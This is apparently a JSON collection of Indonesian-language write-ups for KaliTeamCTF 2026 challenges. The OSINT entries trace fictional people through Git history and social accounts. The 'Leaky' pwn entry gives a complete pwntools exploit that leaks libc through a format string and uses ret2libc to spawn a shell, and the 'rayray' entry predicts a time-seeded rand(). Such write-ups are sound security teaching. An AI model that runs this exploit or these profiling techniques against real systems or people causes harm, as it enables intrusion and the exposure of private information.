        "content": "Caption:\n\n```text\nFinal handover at the assigned warehouse.\n```\n\nKode gudang terlihat jelas:\n\n```text\nC-12\n```\n\nKarena format flag tidak menggunakan tanda baca:\n\n```text\nC-12\n```\n\nmenjadi\n\n```text\nC12\n```\n\nSehingga:\n\n```text\nWAREHOUSE = C12\n```\n\n### Rabbit Hole — C-1 vs C-12\n\nGambar pertama hanya menunjukkan area penerimaan barang.\n\nSedangkan gambar kedua memperlihatkan lokasi serah terima akhir dengan kode gudang yang lengkap.\n\n---"
      },
      {
        "title": "12. Rabbit Hole — Netlify CNAME",
        "content": "DNS menunjukkan seluruh subdomain menggunakan Netlify.\n\n```text\nops\n→ stunning-panda-c6bb8d.netlify.app\n\nmedia\n→ roaring-cocada-527669.netlify.app\n\ntenders\n→ dapper-frangipane-1f1f5c.netlify.app\n```\n\nAwalnya nama deployment Netlify sempat dianggap sebagai identifier portal.\n\nContoh kandidat:\n\n```text\nSTUNNING-PANDA-C6BB8D\n```\n\nNamun ternyata hanya nama deployment otomatis.\n\nIdentifier portal yang benar sudah ditampilkan langsung:\n\n```text\nOPS\n```\n\n---"
      },
      {
        "title": "13. Rabbit Hole — OCR dan EXIF",
        "content": "Metadata gambar diperiksa menggunakan:\n\n```bash\nexiftool nq441_a.jpg nq441_b.jpg\n```\n\nHasil hanya berupa metadata JPEG standar.\n\nOCR juga dicoba menggunakan:\n\n```bash\ntesseract nq441_b.jpg stdout --psm 11\n```\n\nNamun hasil OCR kurang akurat.\n\nPada akhirnya:\n\n* EXIF tidak mengandung petunjuk.\n* OCR tidak diperlukan.\n* Informasi dapat diperoleh melalui observasi visual dan caption.\n\n---"
      },
      {
        "title": "14. Penyusunan Flag",
        "content": "Seluruh komponen berhasil diperoleh.\n\n| Slot         | Nilai         | Sumber                             |\n| ------------ | ------------- | ---------------------------------- |\n| CONTACT      | MAZEN_DARWISH | award_notice_NQ441.pdf             |\n| REGISTRATION | 104728        | supplier_prequalification_2025.pdf |\n| PORTAL       | OPS           | Operations Portal                  |\n| WAREHOUSE    | C12           | Foto final handover                |\n| AREA         | SAHAB         | Signage lokasi                     |\n\nFormat:\n\n```text\nKaliTeam{CONTACT_REGISTRATION_PORTAL_WAREHOUSE_AREA}\n```\n\nHasil akhir:\n\n```text\nKaliTeam{MAZEN_DARWISH_104728_OPS_C12_SAHAB}\n```\n\n---"
      },
      {
        "title": "15. Alur Penyelesaian",
        "content": "```text\nInvoice\n   │\n   ├── Domain: asterion.kali-team.online\n   └── Project: NQ-441\n          │\n          ▼\nSubdomain Enumeration\n          │\n          ├── ops.asterion...\n          │      └── PORTAL CODE: OPS\n          │\n          ├── tenders.asterion...\n          │      ├── /archive/\n          │      │      └── award_notice_NQ441.pdf\n          │      │              └── Mazzen Darwish\n          │      │\n          │      └── /vendor-docs/\n          │             └── supplier_prequalification_2025.pdf\n          │                     └── Registration No. 104728\n          │\n          └── media.asterion...\n                 └── /projects/nq-441/\n                        ├── nq441_a.jpg\n                        └── nq441_b.jpg\n                               ├── Warehouse C-12 → C12\n                               └── Sahab Industrial Estate → SAHAB\n```\n\n---"
      },
      {
        "title": "Final Flag",
        "content": "```text\nKaliTeam{MAZEN_DARWISH_104728_OPS_C12_SAHAB}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{CONTACT_REGISTRATION_PORTAL_WAREHOUSE_AREA}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-misc-whoami",
    "title": "Writeup CTF - WhoAmI? Cyber-eto",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - WhoAmI? Cyber-eto",
    "problemDescription": "Challenge ini mengisahkan seorang developer bernama **Julian AbuTaifeha** yang mengaku salah satu tools buatannya telah dikompromikan. Petunjuk awal mengarahkan peserta untuk menemukan akun Reddit miliknya menggunakan **Initial-Based Username Convention**, kemudian mengikuti jejak digitalnya hingga memperoleh flag.\n\nSecara garis besar alur penyelesaiannya adalah sebagai berikut:\n\n```text\nJulian AbuTaifeha\n        │\n        ▼\nReddit : J_AbuTaifeha\n        │\n        ▼\nGitHub : J-AbuTaifeha\n        │\n        ├── I-m-Good-at-Cyber-Security-\n        │       └── Commit lama mengungkap nama penyerang\n        │\n        ├── Julian-s-Calculator\n        │       └── Commit lama mengungkap petunjuk Telegram Bot\n        │\n        └── MyFirstProject\n                └── Riwayat README membocorkan username bot\n                        │\n                        ▼\n                Telegram Bot\n                        │\n                        ▼\nKaliTeam{1_th1nk_y0u_kn0w_051NT!}\n```\n\n---",
    "tools": [],
    "analysis": "Challenge memberikan dua petunjuk:\n\n> Use the Initial-Based Username Convention to reach Julian's account.\n\n> *\"The one you are looking with is the one you are looking for.\"*\n\nDari nama:\n\n```text\nJulian AbuTaifeha\n```\n\ngunakan inisial nama depan kemudian diikuti nama belakang.\n\nHasilnya:\n\n```text\nJ_AbuTaifeha\n```\n\n---\n\nRepository:\n\n```text\nI-m-Good-at-Cyber-Security-\n```\n\nSalah satu commit yang menarik:\n\n```text\n2ab6458\n```\n\nPerubahan kode:\n\nSebelumnya:\n\n```python\nprint(\"Status: Strong Password! 🔒\")\n```\n\nSesudah dikompromikan:\n\n```python\nprint(\"Think you are good at cyber security ?! You have just got hacked by Mythos !\")\n```\n\nDari commit tersebut diperoleh nama penyerang:\n\n```text\nMythos\n```\n\nCommit berikutnya menghapus perubahan tersebut sehingga hanya dapat ditemukan melalui riwayat Git.\n\n---\n\nRepository:\n\n```text\nJulian-s-Calculator\n```\n\nCommit penting:\n\n```text\n8b150e9\n```\n\nPerubahan yang dilakukan attacker:\n\nSebelumnya:\n\n```python\nprint(\"Invalid operator!\")\n```\n\nSesudah dimodifikasi:\n\n```python\nprint(\"Invalid operator! You didn't know that I've also hacked your bot? Try to use it ;)\")\n```\n\nPesan tersebut memberikan petunjuk baru bahwa **Telegram Bot Julian juga telah dikompromikan**.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** WhoAmI? Cyber-eto\n- **Kategori:** OSINT\n\n---"
      },
      {
        "title": "Menemukan Akun Reddit",
        "content": "Username tersebut mengarah ke akun Reddit:\n\n```text\nu/J_AbuTaifeha\n```\n\nPada akun tersebut terdapat posting mengenai salah satu tool miliknya yang telah dikompromikan.\n\nJudul posting tersebut mengarahkan peserta untuk menyelidiki repository yang dimiliki Julian.\n\n---"
      },
      {
        "title": "Menelusuri Repository GitHub",
        "content": "Dengan pola username yang sama, akun GitHub ditemukan menggunakan variasi tanda hubung:\n\n```text\nJ-AbuTaifeha\n```\n\nRepository yang relevan:\n\n```text\nMyFirstProject\nJulian-s-Calculator\nI-m-Good-at-Cyber-Security-\n```\n\nPada tampilan terbaru repository tidak ditemukan informasi mencurigakan. Seluruh petunjuk justru berada pada **riwayat commit Git**.\n\n---"
      },
      {
        "title": "Memulihkan Username Telegram",
        "content": "Repository berikutnya:\n\n```text\nMyFirstProject\n```\n\nREADME terbaru hanya menampilkan username Telegram yang telah disensor:\n\n```text\n@##########_bot\n```\n\nNamun pada commit lama ditemukan isi README sebelumnya:\n\n```text\n@AbuTa1f3ha_###\n```\n\nGabungkan kedua potongan tersebut:\n\n```text\n@AbuTa1f3ha_###\n@##########_bot\n```\n\nHasil akhirnya adalah:\n\n```text\n@AbuTa1f3ha_bot\n```\n\n---"
      },
      {
        "title": "Verifikasi Telegram Bot",
        "content": "Username tersebut mengarah ke Telegram Bot:\n\n```text\n@AbuTa1f3ha_bot\n```\n\nBot memiliki nama:\n\n```text\nJ-AbuTa1f3ha\n```\n\nPada saat pengujian, bot tidak merespons perintah seperti:\n\n```text\n/start\n/help\n/flag\n```\n\nHal ini kemungkinan disebabkan backend bot sudah tidak aktif. Namun, keberadaan bot beserta username-nya telah dapat diverifikasi melalui riwayat repository Git sehingga jalur OSINT tetap valid.\n\n---"
      },
      {
        "title": "Penyusunan Flag",
        "content": "Seluruh petunjuk akhirnya mengarah pada flag:\n\n```text\nKaliTeam{1_th1nk_y0u_kn0w_051NT!}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{1_th1nk_y0u_kn0w_051NT!}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-osint-lastshift",
    "title": "Writeup CTF - The Last Shift",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - The Last Shift",
    "problemDescription": "Challenge ini meminta empat informasi mengenai seorang volunteer **ByteBridge 2025**, yaitu:\n\n- Nama lengkap\n- Volunteer ID\n- Zona kerja\n- Neighborhood yang berkaitan dengan aktivitas online miliknya\n\nArtefak awal yang diberikan berupa sebuah tangkapan layar (`evidence.png`) dari postingan X (Twitter) yang telah dihapus. Dari gambar tersebut peserta harus melakukan penelusuran OSINT hingga memperoleh identitas volunteer beserta lokasi yang diminta.\n\n---",
    "tools": [],
    "analysis": "Dari gambar diperoleh beberapa petunjuk awal:\n\n```text\nUsername   : nullvoyager1\nEvent      : ByteBridge 2025\nNama depan : Nader\nReferensi  : R03\n```\n\nPetunjuk **R03** menjadi fokus utama karena tampak seperti kode dokumen atau referensi internal yang kemungkinan berkaitan dengan pembagian area volunteer.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** The Last Shift\n- **Kategori:** OSINT\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "Challenge menyediakan satu file:\n\n```text\nevidence.png\n```\n\nIsi gambar memperlihatkan beberapa petunjuk penting, antara lain:\n\n- Postingan dari akun **nullvoyager1**\n- Hashtag **#ByteBridge2025**\n- Badge volunteer\n- Label **R03** pada flight case\n- Jadwal backstage\n- Gelas bertuliskan **Nader**\n\nTulisan pada badge tidak terbaca dengan jelas sehingga diperlukan pencarian informasi tambahan dari sumber lain.\n\n---"
      },
      {
        "title": "Menelusuri Repository GitHub",
        "content": "Pencarian terhadap username **nullvoyager1** mengarah ke sebuah repository GitHub:\n\n```text\nhttps://github.com/nullvoyager1/skyline-parser\n```\n\nRepository tersebut tampak seperti proyek Python sederhana. Namun, pada riwayat commit terdapat folder referensi:\n\n```text\nassets/reference/\n```\n\nSalah satu file yang menarik adalah:\n\n```text\nassets/reference/r03.pdf\n```\n\n---"
      },
      {
        "title": "Memulihkan Riwayat Git",
        "content": "Clone repository:\n\n```bash\ngit clone https://github.com/nullvoyager1/skyline-parser.git\ncd skyline-parser\n```\n\nLihat seluruh riwayat commit:\n\n```bash\ngit --no-pager log --all \\\n  --graph \\\n  --decorate \\\n  --oneline \\\n  --parents\n```\n\nDitemukan bahwa beberapa commit lama tidak lagi berada pada branch utama.\n\nSalah satu commit dapat dipulihkan menggunakan SHA berikut:\n\n```bash\ngit fetch origin \\\n  83791dcad7c5c006f5f889073307d68716aeff60\n```\n\nKemudian buat branch lokal:\n\n```bash\ngit branch recovered-old \\\n  83791dcad7c5c006f5f889073307d68716aeff60\n```\n\nUntuk melihat seluruh riwayat secara kronologis:\n\n```bash\ngit --no-pager log --all --reverse \\\n  --format='%h | parent=%p | %an <%ae> | %aI | %s'\n```\n\nRiwayat commit yang berhasil dipulihkan:\n\n```text\n205d8d8 initial parser skeleton\n2fcf208 add command line entry point\n0c2f940 ignore comment lines\n557b3bd validate empty fields\n6d9461a add second sample capture\n83791dc record local benchmark\n8ae84dd organize reference fixtures\nd787e1d update reference fixtures\n62ef8e2 limit csv field splitting\n5ace74c record screenshot settings\nb4914b9 refresh reference set\nea89e50 add parser tests\n18c1826 report input errors cleanly\n4488988 document input format\n```\n\n---"
      },
      {
        "title": "Menemukan Dokumen R03",
        "content": "Seluruh isi setiap commit diekstrak menggunakan:\n\n```bash\nmkdir -p ../full_history\n\nfor sha in $(git rev-list --reverse --all); do\n    short=$(git rev-parse --short \"$sha\")\n    mkdir -p \"../full_history/$short\"\n\n    git archive \"$sha\" |\n        tar -x -C \"../full_history/$short\"\ndone\n```\n\nKemudian cari file yang berkaitan dengan **R03**:\n\n```bash\nfind ../full_history -type f | grep -i 'r03'\n```\n\nHasil:\n\n```text\nassets/reference/r03.pdf\n```\n\nDokumen tersebut berisi daftar volunteer beserta pembagian zona kerja.\n\nInformasi yang diperoleh:\n\n```text\nFull Name    : Nader Khoury\nVolunteer ID : BB25-052\nWork Zone    : B3\nPortal Handle: naderk_47\n```\n\nDokumen juga menjelaskan bahwa zona **B3** merupakan area:\n\n```text\nMedia desk and backstage corridor\n```\n\nSampai tahap ini diperoleh sebagian besar format flag:\n\n```text\nKaliTeam{NADER_KHOURY_BB25-052_B3_...}\n```\n\n---"
      },
      {
        "title": "Menelusuri Aktivitas Online",
        "content": "Handle yang ditemukan pada dokumen:\n\n```text\nnaderk_47\n```\n\nDigunakan sebagai petunjuk untuk mencari akun media sosial lain milik volunteer.\n\nPencarian mengarah pada sebuah posting Instagram:\n\n```text\nhttps://www.instagram.com/p/DboxjvbMhAL/\n```\n\nBeberapa elemen pada foto sesuai dengan konteks challenge, antara lain:\n\n- Laptop dengan folder **the-last-shift**\n- Catatan bertuliskan **The Last Shift**\n- Berbagai stiker bertema ASU\n- Latar belakang kota Amman\n\nLokasi aktivitas online tersebut mengarah ke neighborhood:\n\n```text\nJabal Lweibdeh\n```\n\nUntuk format flag, nama lokasi dinormalisasi menjadi:\n\n```text\nJABAL_LWEIBDEH\n```\n\n---"
      },
      {
        "title": "Penyusunan Flag",
        "content": "Format flag yang diminta:\n\n```text\nKaliTeam{FIRST_LAST_VOLUNTEER_ID_ZONE_NEIGHBORHOOD}\n```\n\nHasil yang diperoleh:\n\n```text\nFIRST        = NADER\nLAST         = KHOURY\nVOLUNTEER_ID = BB25-052\nZONE         = B3\nNEIGHBORHOOD = JABAL_LWEIBDEH\n```\n\nSehingga flag akhirnya adalah:\n\n```text\nKaliTeam{NADER_KHOURY_BB25-052_B3_JABAL_LWEIBDEH}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{NADER_KHOURY_BB25-052_B3_JABAL_LWEIBDEH}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-pwn-leaky",
    "title": "Writeup CTF - Leaky",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Leaky",
    "problemDescription": "",
    "tools": [],
    "analysis": "Lakukan pengecekan menggunakan `checksec`:\n\n```bash\nchecksec --file=leaky\n```\n\nHasil:\n\n```text\nArch:       amd64\nRELRO:      Full RELRO\nCanary:     No canary found\nNX:         NX enabled\nPIE:        No PIE\nSHSTK:      Enabled\nIBT:        Enabled\n```\n\nDari hasil tersebut dapat disimpulkan:\n\n- **No Canary** → Stack buffer overflow dapat dilakukan tanpa perlu membocorkan canary.\n- **NX Enabled** → Shellcode pada stack tidak dapat dijalankan.\n- **No PIE** → Alamat fungsi dan GOT pada binary bersifat tetap.\n- **Full RELRO** → GOT bersifat read-only sehingga teknik overwrite GOT tidak dapat digunakan.\n- Disediakan `libc.so.6`, sehingga eksploitasi **ret2libc** menjadi pilihan yang paling memungkinkan.\n\n---\n\n### Menentukan Offset Overflow\n\nLayout stack:\n\n```text\nbuffer      : 16 byte\nsaved RBP   : 8 byte\nsaved RIP\n```\n\nSehingga offset menuju return address adalah:\n\n```text\n16 + 8 = 24 byte\n```\n\n```text\nOFFSET = 24\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Leaky\n- **Kategori:** Pwn\n- **Service**\n\n```text\nnc chall.kali-team.online 10093\n```\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "Challenge menyediakan beberapa file berikut:\n\n```text\nflag.txt\nld-linux-x86-64.so.2\nleaky\nlibc.so.6\n```\n\n---"
      },
      {
        "title": "Reverse Engineering",
        "content": "Binary dianalisis menggunakan **radare2**.\n\n```bash\nr2 -A leaky\n```\n\nPada fungsi `challenge()` ditemukan potongan kode berikut:\n\n```asm\nputs(\"Welcome! Enter input:\")\n\nlea rax, [rbp-0x10]\n\nmov edi, 0\ncall read\n\nlea rax, [rbp-0x10]\nmov rdi, rax\n\ncall printf\n```\n\nApabila diterjemahkan ke bentuk C sederhana:\n\n```c\nchar buffer[16];\n\nread(0, buffer, 0x60);\nprintf(buffer);\n```\n\nTerlihat adanya dua kerentanan sekaligus:\n\n1. **Format String Vulnerability**\n\n```c\nprintf(buffer);\n```\n\nInput pengguna langsung dijadikan format string.\n\n2. **Stack Buffer Overflow**\n\n```c\nread(0, buffer, 0x60);\n```\n\nBuffer hanya berukuran 16 byte, namun program membaca hingga 96 byte.\n\n---"
      },
      {
        "title": "Tahap 1 - Leak Alamat libc",
        "content": "Karena terdapat format string vulnerability, alamat pada Global Offset Table (GOT) dapat dibaca.\n\nTarget yang digunakan adalah:\n\n```text\nprintf@got\n```\n\nPayload format string:\n\n```text\nLEAK%11$sEND\n```\n\nPayload kemudian dipadukan dengan overflow sehingga setelah `printf()` selesai, eksekusi kembali ke fungsi `challenge()` untuk tahap berikutnya.\n\n```python\npayload = b\"LEAK%11$sEND\"\npayload += b\"\\x00\"\n\npayload = payload.ljust(24, b\"A\")\n\npayload += p64(ret)\npayload += p64(elf.symbols[\"challenge\"])\npayload += p64(elf.got[\"printf\"])\n```\n\nOutput akan membocorkan alamat asli `printf()` dari libc.\n\nContoh:\n\n```text\nprintf = 0x7fxxxxxxxxxxxx\n```\n\n---"
      },
      {
        "title": "Menghitung Base libc",
        "content": "Setelah alamat `printf` diperoleh, base address libc dapat dihitung.\n\n```python\nlibc.address = (\n    printf_addr -\n    libc.symbols[\"printf\"]\n)\n```\n\nDengan base address tersebut, seluruh simbol libc dapat diketahui, termasuk:\n\n- `system`\n- `exit`\n- string `\"/bin/sh\"`\n\n---"
      },
      {
        "title": "Tahap 2 - ret2libc",
        "content": "Gunakan gadget:\n\n```text\npop rdi ; ret\n```\n\nuntuk mengisi argumen pertama bagi fungsi `system()`.\n\nCari alamat string:\n\n```text\n\"/bin/sh\"\n```\n\ndi dalam libc.\n\nPayload akhir:\n\n```python\npayload = b\"A\" * 24\n\npayload += p64(ret)\npayload += p64(pop_rdi)\npayload += p64(binsh)\npayload += p64(system)\n```\n\nAlur eksekusi menjadi:\n\n```text\nBuffer Overflow\n      │\n      ▼\n pop rdi ; ret\n      │\n      ▼\n \"/bin/sh\"\n      │\n      ▼\nsystem(\"/bin/sh\")\n```\n\nSetelah shell diperoleh, cukup menjalankan:\n\n```bash\ncat flag.txt\n```\n\n---"
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nHOST = \"chall.kali-team.online\"\nPORT = 10093\n\nelf = ELF(\"./leaky\", checksec=False)\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\ncontext.binary = elf\ncontext.log_level = \"info\"\n\nOFFSET = 24\n\nio = remote(HOST, PORT)\n\n# ==========================\n# Stage 1 - Leak libc\n# ==========================\n\nio.recvuntil(b\"Welcome! Enter input:\")\n\nrop = ROP(elf)\nret = rop.find_gadget([\"ret\"]).address\n\npayload = b\"LEAK%11$sEND\"\npayload += b\"\\x00\"\n\npayload = payload.ljust(OFFSET, b\"A\")\n\npayload += p64(ret)\npayload += p64(elf.symbols[\"challenge\"])\npayload += p64(elf.got[\"printf\"])\n\nio.sendline(payload)\n\nio.recvuntil(b\"LEAK\")\n\nleak = io.recvuntil(\n    b\"END\",\n    drop=True\n)\n\nprintf_addr = u64(\n    leak[:8].ljust(8, b\"\\x00\")\n)\n\nlibc.address = (\n    printf_addr -\n    libc.symbols[\"printf\"]\n)\n\nlog.success(\n    f\"libc base = {hex(libc.address)}\"\n)\n\n# ==========================\n# Stage 2 - ret2libc\n# ==========================\n\nio.recvuntil(\n    b\"Welcome! Enter input:\"\n)\n\nrop = ROP(libc)\n\npop_rdi = rop.find_gadget(\n    [\"pop rdi\", \"ret\"]\n).address\n\nbinsh = next(\n    libc.search(b\"/bin/sh\\x00\")\n)\n\nsystem = libc.symbols[\"system\"]\n\npayload = b\"A\" * OFFSET\n\npayload += p64(ret)\npayload += p64(pop_rdi)\npayload += p64(binsh)\npayload += p64(system)\n\nio.sendline(payload)\n\nio.sendline(b\"cat flag.txt\")\n\nio.interactive()\n```\n\n---"
      },
      {
        "title": "Menjalankan Exploit",
        "content": "```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\n$ cat flag.txt\nKaliTeam{868d559b-f5ae-4d77-b8a0-923389f7f68b}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nimport re\r\nfrom pwn import *\r\n\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"leaky\"\r\nLIBC_PATH = BASE_DIR / \"libc.so.6\"\r\nLD_PATH = BASE_DIR / \"ld-linux-x86-64.so.2\"\r\n\r\nHOST = \"chall.kali-team.online\"\r\nPORT = 10093\r\n\r\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\r\nlibc = ELF(str(LIBC_PATH), checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\nPROMPT = b\"Welcome! Enter input:\"\r\nOFFSET = 24\r\nFMT_INDEX = 11\r\n\r\n\r\ndef argv():\r\n    if LD_PATH.exists() and LIBC_PATH.exists():\r\n        return [str(LD_PATH), \"--library-path\", str(BASE_DIR), str(BINARY_PATH)]\r\n    return [str(BINARY_PATH)]\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        host = args.HOST or HOST\r\n        port = int(args.PORT or PORT)\r\n        return remote(host, port)\r\n\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            argv(),\r\n            gdbscript=\"\"\"\r\n            set pagination off\r\n            break *challenge+126\r\n            continue\r\n            \"\"\",\r\n        )\r\n\r\n    return process(argv(), cwd=str(BASE_DIR))\r\n\r\n\r\ndef recv_prompt(io):\r\n    data = io.recvuntil(PROMPT, timeout=5)\r\n    if PROMPT not in data:\r\n        raise RuntimeError(f\"prompt tidak ditemukan, output={data!r}\")\r\n\r\n\r\ndef leak_printf(io):\r\n    recv_prompt(io)\r\n\r\n    ret = ROP(elf).find_gadget([\"ret\"]).address\r\n    payload = f\"LEAK%{FMT_INDEX}$sEND\".encode()\r\n    payload += b\"\\x00\"\r\n    payload = payload.ljust(OFFSET, b\"A\")\r\n\r\n    # ret sebelum challenge memperbaiki alignment stack untuk printf kedua.\r\n    payload += p64(ret)\r\n    payload += p64(elf.symbols[\"challenge\"])\r\n    payload += p64(elf.got[\"printf\"])\r\n\r\n    io.sendline(payload)\r\n    io.recvuntil(b\"LEAK\", timeout=5)\r\n    leak = io.recvuntil(b\"END\", drop=True, timeout=5)\r\n    if len(leak) < 5:\r\n        raise RuntimeError(f\"leak printf terlalu pendek: {leak!r}\")\r\n\r\n    printf_addr = u64(leak[:8].ljust(8, b\"\\x00\"))\r\n    if (printf_addr & 0xfff) != (libc.symbols[\"printf\"] & 0xfff):\r\n        raise RuntimeError(\r\n            f\"leak printf tidak valid: {hex(printf_addr)} \"\r\n            f\"offset={hex(printf_addr & 0xfff)}\"\r\n        )\r\n\r\n    libc.address = printf_addr - libc.symbols[\"printf\"]\r\n    log.success(f\"printf leak = {hex(printf_addr)}\")\r\n    log.success(f\"libc base   = {hex(libc.address)}\")\r\n\r\n\r\ndef spawn_shell(io):\r\n    recv_prompt(io)\r\n\r\n    rop = ROP(libc)\r\n    ret = rop.find_gadget([\"ret\"]).address\r\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\n    bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\r\n    system = libc.symbols[\"system\"]\r\n    exit_func = libc.symbols[\"exit\"]\r\n\r\n    log.info(f\"ret      = {hex(ret)}\")\r\n    log.info(f\"pop rdi  = {hex(pop_rdi)}\")\r\n    log.info(f\"/bin/sh  = {hex(bin_sh)}\")\r\n    log.info(f\"system   = {hex(system)}\")\r\n\r\n    payload = b\"A\" * OFFSET\r\n    payload += p64(ret)\r\n    payload += p64(pop_rdi)\r\n    payload += p64(bin_sh)\r\n    payload += p64(system)\r\n    payload += p64(exit_func)\r\n\r\n    io.sendline(payload)\r\n\r\n\r\ndef exploit(io):\r\n    leak_printf(io)\r\n    spawn_shell(io)\r\n    io.sendline(b\"cat flag.txt; exit\")\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n    data = io.recvrepeat(timeout=2)\r\n    if data:\r\n        print(data.decode(errors=\"replace\"), end=\"\")\r\n        match = re.search(rb\"KaliTeam\\{[^}\\n]+\\}\", data)\r\n        if match:\r\n            log.success(f\"flag = {match.group(0).decode()}\")\r\n\r\n    if io.connected():\r\n        io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{868d559b-f5ae-4d77-b8a0-923389f7f68b}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-pwn-rayray",
    "title": "Writeup CTF - rayray",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - rayray",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge ini sebenarnya bukan kerentanan memory corruption.\n\nMasalah utamanya adalah penggunaan **pseudo-random number generator** yang diprediksi dengan mudah.\n\nLokasi flag ditentukan menggunakan:\n\n```c\nsrand(time(NULL));\nflag_index = rand() % 100;\n```\n\nKarena seed berasal dari **Unix timestamp saat ini**, siapa pun dapat menghitung kembali nilai `rand()` selama mengetahui waktu server dengan selisih beberapa detik.\n\nChallenge juga menyediakan file `libc.so.6`, sehingga implementasi `rand()` yang digunakan identik dengan milik server. Dengan demikian, indeks blok yang berisi flag dapat diprediksi secara akurat.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** rayray\n- **Kategori:** Pwn\n- **Deskripsi:**\n\n> I like hiding in a random pattern or is it ??\n\n- **Connection**\n\n```text\nnc chall.kali-team.online 10005\n```\n\n---"
      },
      {
        "title": "Initial Recon",
        "content": "Challenge menyediakan tiga file:\n\n```text\nrayray\nlibc.so.6\nld-linux-x86-64.so.2\n```\n\nCek proteksi binary menggunakan `checksec`:\n\n```bash\nchecksec --file=rayray\n```\n\nHasil:\n\n```text\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      No canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    ./\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\n```\n\nDari hasil tersebut terlihat bahwa binary memiliki berbagai mitigasi keamanan seperti **Full RELRO**, **NX**, dan **PIE**, sehingga eksploitasi melalui buffer overflow kemungkinan bukan pendekatan yang tepat.\n\n---"
      },
      {
        "title": "Menjalankan Binary",
        "content": "```bash\n./rayray\n```\n\nContoh output:\n\n```text\nWelcome To My Bounded Portal!\n\nThe flag is here, but can you find where excatly?\n\nenter Block number:\n```\n\nJika memasukkan angka, program akan membaca blok tersebut.\n\nContoh:\n\n```text\nReading block 0...\nDATA: Block 0 data: 0x6B8B4567 (No flag here)\n```\n\nArtinya terdapat 100 blok data, dan hanya satu blok yang berisi flag.\n\n---"
      },
      {
        "title": "Reverse Engineering",
        "content": "Binary dianalisis menggunakan **radare2**.\n\n```bash\nr2 -A rayray\n```\n\nDaftar fungsi:\n\n```bash\nafl\n```\n\nFungsi penting:\n\n```text\nsym.vuln\nmain\n```\n\nDisassembly fungsi utama:\n\n```bash\npdf @ sym.vuln\n```\n\nDari hasil analisis diperoleh alur program sebagai berikut.\n\nPertama, program mengisi seluruh blok menggunakan hasil `rand()`.\n\n```c\nfor (int i = 0; i <= 99; i++) {\n    snprintf(blocks[i], 0x40,\n        \" Block %d data: 0x%08X (No flag here)\",\n        i,\n        rand());\n}\n```\n\nSetelah itu program melakukan:\n\n```c\nsrand(time(NULL));\n```\n\nKemudian memilih lokasi flag:\n\n```c\nint flag_index = rand() % 100;\n```\n\nFlag dibaca dari file dan disimpan pada blok tersebut.\n\n```c\nFILE *fp = fopen(\"./flag.txt\", \"r\");\nfgets(blocks[flag_index], 0x40, fp);\nfclose(fp);\n```\n\nTerakhir, pengguna diminta memasukkan nomor blok.\n\n```c\nif (idx >= 0 && idx <= 99)\n    printf(\"DATA: %s\\n\", blocks[idx]);\n```\n\n---"
      },
      {
        "title": "Strategi Eksploitasi",
        "content": "Langkah eksploitasi:\n\n1. Muat `libc.so.6` yang disediakan challenge.\n2. Ambil waktu saat ini (`time(NULL)`).\n3. Coba beberapa seed di sekitar waktu tersebut untuk mengantisipasi delay jaringan.\n4. Hitung:\n\n```text\nrand() % 100\n```\n\n5. Kirim hasilnya sebagai nomor blok.\n6. Jika output mengandung format flag, proses selesai.\n\nPendekatan ini jauh lebih sederhana dibandingkan melakukan eksploitasi terhadap mitigasi keamanan binary.\n\n---"
      },
      {
        "title": "Solver",
